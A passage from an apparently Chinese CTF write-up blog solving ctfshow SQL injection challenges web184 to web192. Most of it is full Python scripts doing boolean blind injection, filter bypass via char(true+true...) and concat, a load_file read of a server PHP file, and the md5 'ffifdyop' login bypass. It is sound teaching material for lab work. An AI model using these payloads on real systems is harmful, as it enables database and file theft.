class="number">48</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass regexp(0x63746673686f77&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(str2hex(flag+x))</span><br><span class="line">                <span class="comment">#&quot;tableName&quot;:&quot;`ctfshow_user`where`pass`like\&#x27;ctfshow&#123;&#125;%\&#x27;&quot;.format(flag+x)</span></span><br><span class="line">            &#125;</span><br><span class="line">            response=requests.post(url,data=data)</span><br><span class="line">            <span class="comment">#有并发数量限制的题目，就睡一段时间</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">                flag+=x</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ctfshow&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">      main()</span><br></pre></td></tr></table></figure><h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><p>源码</p><p><img src="../images/image-20221229192109344.png" alt="image-20221229192109344"></p><p>这题是把<strong>数字  where 单双引号</strong> 给过滤掉了，那么我们就得想办法构造字符了。</p><p><img src="../images/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center.png" alt="在这里插入图片描述"></p><p>就是利用这个东西来构造字符串，但是我们得需要一个函数来把这些构造出来的东西给连接起来。</p><p><img src="../images/1a58fc8b87484af9952dbcf4f65e90e1.png" alt="img"></p><p>本地测试了一下，发现确实可以。</p><p><img src="../images/image-20221229214124144.png" alt="image-20221229214124144"></p><p>以下脚本摘自这篇文章   <a href="https://blog.csdn.net/m0_48780534/article/details/126155600">https://blog.csdn.net/m0_48780534/article/details/126155600</a></p><p>wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">formatString</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    temp=<span class="string">&quot;concat(&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        tip=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> string.digits:</span><br><span class="line">            tmp=<span class="built_in">int</span>(x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tip=<span class="number">1</span></span><br><span class="line">            temp+=<span class="string">&quot;char(&quot;</span></span><br><span class="line">            tmp=<span class="built_in">ord</span>(x)</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">0</span>:</span><br><span class="line">            temp+=<span class="string">&quot;false&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp_d=<span class="string">&quot;(&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,tmp):</span><br><span class="line">                temp_d+=<span class="string">&quot;true+&quot;</span></span><br><span class="line">            temp_d=temp_d[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">            <span class="keyword">if</span> tip==<span class="number">1</span>:</span><br><span class="line">                temp_d+=<span class="string">&quot;)&quot;</span></span><br><span class="line">            temp+=temp_d</span><br><span class="line">        temp+=<span class="string">&quot;,&quot;</span></span><br><span class="line">    temp=temp[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(formatString(&quot;0x63746673686f777b&quot;))</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://d2f644f5-968d-4301-b037-267c7b183b0e.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"><span class="comment">#dic的顺序可以改一下！我是懒得改了！改顺序可以提高效率！！！</span></span><br><span class="line">dic=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> dic:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass regexp(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(formatString(flag+x))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[**] &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#print(&quot;[--] &#123;&#125; is wrong&quot;.format(x))</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[flag]:&quot;</span>+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个是群主写的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-01-12 01:16:02</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-12 03:50:33</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 每秒发送不超过5个请求</span></span><br><span class="line"><span class="comment"># mysql 官方文档 https://dev.mysql.com/doc/refman/5.7/en/replication.html 5.7版本的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f279fb00-070d-4b47-a72f-0f1a82f2e84a.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line"><span class="comment">#flagstr = &quot;&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">a = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">a += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x))</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;0x&quot;</span>+a.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#63746673686f777b</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">formatString</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line"></span><br><span class="line">temp = <span class="string">&quot;concat(&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">temp +=char2boolean(x)</span><br><span class="line"><span class="keyword">return</span> temp[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">char2boolean</span>(<span class="params">ch</span>):</span><br><span class="line">num = <span class="built_in">ord</span>(ch)</span><br><span class="line">temp = <span class="string">&quot;char(&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">temp +=<span class="string">&quot;true+&quot;</span></span><br><span class="line"><span class="keyword">return</span> temp[:-<span class="number">1</span>]+<span class="string">&quot;),&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;55eff0b8-fa84-4ee8-9cd2-4e84cdd78b73&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">flag=<span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass regexp(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(formatString(flag+x))</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="keyword">if</span> response.text.find(<span class="string">&quot;user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++=&#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">flag+=x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++=&#123;&#125; is wrong&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++=&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20221229221701321.png" alt="image-20221229221701321"></p><p>代码中的char是负责转换字符用的，然后concat是连接字符用的。char转换里的内容是ascii的10进制。</p><h2 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h2><p>源码</p><p><img src="../images/image-20221229221947989.png" alt="image-20221229221947989"></p><p>这道题多过滤了&lt;&gt;  和x00  但是还是可以上一题的脚本来写。</p><p><img src="../images/image-20221229222842518.png" alt="image-20221229222842518"></p><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>源码</p><p><img src="../images/image-20221229222936006.png" alt="image-20221229222936006"></p><p><img src="../images/image-20221229224301702.png" alt="image-20221229224301702"></p><p>以下内容摘自   <a href="https://blog.csdn.net/m0_48780534/article/details/126155600">https://blog.csdn.net/m0_48780534/article/details/126155600</a></p><p>​           本题和web181类似，都是通过<code>1 and 0 or 1</code>达到目的。</p><p>​         这里的二进制格式，并不是指转成0101，而是binary mode。</p><p><img src="../images/image-20221229224630236.png" alt="image-20221229224630236"></p><p><img src="../images/image-20221229224640893.png" alt="image-20221229224640893"></p><p>就是这样的格式。</p><p>那么这道题就得用到这个经过md5(<strong>ffifdyop</strong>)加密过后的东西，里面这段英文解析之后就是上图所示，和万能密码差不多。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from ctfshow_user where username = &#x27;admin&#x27; and password= &#x27;&#x27;or&#x27;6�]��!r,��b&#x27;;</span><br></pre></td></tr></table></figure><p>这个就会变成1 and 0 or 1   的情况，那么最后结果就是  1。</p><p><img src="../images/image-20221229225158366.png" alt="image-20221229225158366"></p><p><img src="../images/image-20221229225309316.png" alt="image-20221229225309316"></p><p>就是类似这种效果。只要第一个数字是数字不是字母就行。</p><p><img src="../images/image-20221229225514311.png" alt="image-20221229225514311"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count(*)  ----&gt;指的是数据库总行数</span><br></pre></td></tr></table></figure><h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>源码</p><p><img src="../images/image-20221229230058797.png" alt="image-20221229230058797"></p><p><strong>这里的考法是mysql的弱类型比较。</strong></p><p><img src="../images/image-20221229230659047.png" alt="image-20221229230659047"></p><p><img src="../images/image-20221229230716625.png" alt="image-20221229230716625"></p><p>这里能爆出来的原因是因为username的值没有用  ‘’   包含起来，那么username的值就为0，数据库中username是字母开头的话，值也为0.那么就可以把这些全部给爆出来了。</p><p><img src="../images/image-20221229230926512.png" alt="image-20221229230926512"></p><p>这个能爆出的原因是这个的username为1ab，转换过来的话值是为1的。那么就可以爆出值为1的password.</p><p><img src="../images/image-20221229231221101.png" alt="image-20221229231221101"></p><p>username和password都用0的原因是，两个if判断都为弱类型比较，<strong>0都会等于字母开头的字符串</strong></p><p>就是利用这一点，拿到了flag。</p><h2 id="web189-bool盲注"><a href="#web189-bool盲注" class="headerlink" title="web189(bool盲注)"></a>web189(bool盲注)</h2><p>源码</p><p><img src="../images/image-20221229231806534.png" alt="image-20221229231806534"></p><p>和上一题的内容一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag在api/index.php文件中     ----&gt;  给的提示</span><br></pre></td></tr></table></figure><p>看一下登录的返回情况有没有差别：<br>username=0、password=0时，返回“密码错误”。（说明存在用户，但是密码错误）<br>username=1、password=0时，返回“查询失败”。（说明用户不存在）</p><p>因为输入0  和 1返回的结果不同，加上过滤了联合注入需要的东西，那么我们就得考虑bool盲注的问题了。</p><p><strong>群主写的脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dc02940d-e22b-4796-ab0f-04bdf57d3a9f.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;&#125;&#123;&lt;&gt;$=,;_ &#x27;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#这个位置，是群主耗费很长时间跑出来的位置~</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>,<span class="number">257</span>+<span class="number">60</span>):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;username&quot;</span>:<span class="string">&quot;if(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)&quot;</span>.<span class="built_in">format</span>(i,x),</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="keyword">if</span> response.text.find(<span class="string">&quot;8d25&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="comment">#8d25是username等于1时返回的东西，0返回时的东西不是8d25.</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">flag+=x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>data里的意思是，如果返回的值里的第n位与字符串里的某位相等，则返回1</p><p><img src="../images/image-20221230165849922.png" alt="image-20221230165849922"></p><h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><p>源码</p><p><img src="../images/image-20221230205113908.png" alt="image-20221230205113908"></p><p>这道题给了个提示说是bool盲注</p><p><img src="../images/image-20221230205237454.png" alt="image-20221230205237454"></p><p>提示密码错误。</p><p><img src="../images/image-20221230205303277.png" alt="image-20221230205303277"></p><p>输入别的提示用户名不存在，所以可以得出用户名处存在sql注入。这题没有过滤字符，那么直接用群主写的二分法脚本来跑就行了。(以后遇到bool盲注的题，可以修改脚本一下直接用就行了)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-12 05:48:30</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1429d815-6439-47de-ab04-5782a8bbf349.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == mid):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;77de2af3-6f34-4d20-adc7-8aba40a40ffe&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><p>源码</p><p><img src="../images/image-20221230205641079.png" alt="image-20221230205641079"></p><p>这题相较上题而言，增加了过滤。但是影响不大，把web190的脚本拿来修改一下就好了。</p><p><img src="../images/image-20221230210418369.png" alt="image-20221230210418369"></p><p>这两个函数是一样的，可以替换着来用</p><p>修改后的wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-12 05:48:30</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://86c12830-4c24-41b4-bf71-64e3ad3646d1.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == mid):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and (ord(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;77de2af3-6f34-4d20-adc7-8aba40a40ffe&#125;</span></span><br></pre></td></tr></table></figure><p>利用ord()来替换。</p><h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><p>源码</p><p><img src="../images/image-20221230212728629.png" alt="image-20221230212728629"></p><p>这里是把ord和ascii都给过滤掉了，那么我们就可以考虑不用编码成数字的形式来解题，可以直接遍历字符串来看是否相等。</p><p>群主写的wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 